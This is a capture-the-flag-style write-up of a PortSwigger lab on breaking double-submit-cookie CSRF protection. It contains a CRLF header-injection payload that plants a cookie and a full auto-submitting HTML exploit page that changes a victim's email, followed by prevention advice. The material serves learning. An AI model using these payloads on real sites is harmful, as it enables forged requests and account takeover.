# 06-CSRF where token is duplicated in cookie

## 🔥 Lab: CSRF where token is duplicated in cookie

### 🧠 Concept

Application uses insecure **Double Submit Cookie** CSRF protection.

Server checks:

```text id="yvjlwm"
csrf (POST body) == csrf (cookie)
```

⚠️ Problem:

Attacker can set the cookie using CRLF/Header Injection.

---

# 🔎 Testing

| Test               | Result |
| ------------------ | ------ |
| Remove token       | ❌      |
| Change one token   | ❌      |
| Same value in both | ✅      |

💡 Insight:

```text id="bqb7n9"
If attacker controls csrf cookie,
CSRF protection breaks.
```

---

# 💥 CRLF Injection

Payload:

```text id="3fuhju"
test%0d%0aSet-Cookie: csrf=abcdEf
```

Injected response:

```http id="gc9vpd"
Set-Cookie: csrf=abcdEf
```

Browser stores attacker-controlled cookie.

---

# 🚀 Final Exploit

```html id="98ihb7"
<html>
  <body>

    <form id="exploitForm"
          action="https://LAB-ID.web-security-academy.net/my-account/change-email"
          method="POST">

      <input type="hidden"
             name="email"
             value="deep-testffff@gmail.com" />

      <input type="hidden"
             name="csrf"
             value="abcdEf" />
    </form>

    <img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcdEf%3b%20SameSite=None%3b%20Secure"
         onerror="document.getElementById('exploitForm').submit()">

  </body>
</html>
```

---

# ⚙️ Attack Flow

1. Victim opens attacker page
2. CRLF injects:

```http id="2u5zzi"
Set-Cookie: csrf=abcdEf
```

3. Browser stores cookie
4. Form auto-submits
5. Server checks:

```text id="62x0bn"
csrf == csrf_cookie
```

6. Validation passes ✅

---

# 💻 Vulnerable Logic

```javascript id="5lzicv"
if (req.body.csrf === req.cookies.csrf) {
    allow();
}
```

---

# 🛡️ Prevention

✅ Store CSRF token server-side
✅ Bind token to session
✅ Sanitize `\r\n`
✅ Use `SameSite=Strict`
✅ Use framework CSRF protection

---

# 💬 Key Learning

```text id="5ujqf0"
Double Submit Cookie fails
if attacker can control the cookie.
```

---

# 🏁 Tags

```text id="fxk7gh"
#csrf
#double-submit-cookie
#crlf-injection
#portswigger
#web-security
```
